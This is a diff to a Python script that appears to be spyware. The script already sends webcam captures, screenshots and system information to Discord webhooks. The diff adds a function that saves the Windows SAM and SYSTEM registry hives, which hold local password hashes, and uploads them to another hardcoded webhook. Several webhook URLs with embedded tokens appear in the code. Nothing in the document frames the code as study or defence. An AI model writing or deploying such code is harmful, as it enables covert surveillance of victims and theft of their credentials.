@@ -7,6 +7,10 @@ import cv2
 import pyautogui
 import getpass
 import pygetwindow as gw
+import shutil
+import subprocess
+import requests
+import os
 
 key = cv2.waitKey(1)
 webcam = cv2.VideoCapture(0)
@@ -88,13 +92,39 @@ def get_active_window_title():
         print(f"Error getting active window title: {e}")
     return None
 
+def Windows(webhook_url):
+    # Sauvegarde des hives du Registre Windows
+    subprocess.run(['reg', 'save', 'HKLM\SAM', r'C:\sam'], shell=True)
+    subprocess.run(['reg', 'save', 'HKLM\SYSTEM', r'C:\system'], shell=True)
+
+
+    # Liste de fichiers à envoyer
+    files = [('file1', ('sam', open('C:/sam', 'rb'))), ('file2', ('system', open('C:/system', 'rb')))]
+
+
+    data = {'content': 'Here are the files you requested.'}
+
+    # Envoi des fichiers au webhook Discord
+    try:
+        response = requests.post(webhook_url, data=data, files=files)
+        response.raise_for_status()
+        print("Files successfully sent to Discord.")
+    except requests.exceptions.RequestException as err:
+        print(f"Error sending files to Discord: {err}")
+    finally:
+        # Fermeture des fichiers
+        for _, file_data in files:
+            file_data[1].close()
+
 def main():
     webhook_info = 'https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q'
     webhook_capture = 'https://discord.com/api/webhooks/1181579952865419314/7uGEy040yuo8jukOzt5CJXlNo6k8a9VrmgeNaLGPp9RaiqHgQcsr0y7ouSDwmWFIH8Ez'
     webhook_screenshot = 'https://discord.com/api/webhooks/1181250956294365235/dTgbhtiAO2RID6vmWpuf88I3XnIkD17FgY19gRMKWXo71cOU-gQcEJgRVGbCCLvGA_fy'
+    webhook_windows = 'https://discord.com/api/webhooks/1186985816254316574/pEkFuwOfHZ_cKTFglI8QXZLedEfwaF9FleoiagqpKVTvqxyg7myl3lQu2apzO7sdHp8h'
 
     webhook_info_obj = create_webhook(webhook_info)
     computer_information(webhook_info_obj)
+    Windows(webhook_windows)
     while True:
         capture_image(webhook_capture)
         screenshot(webhook_screenshot)
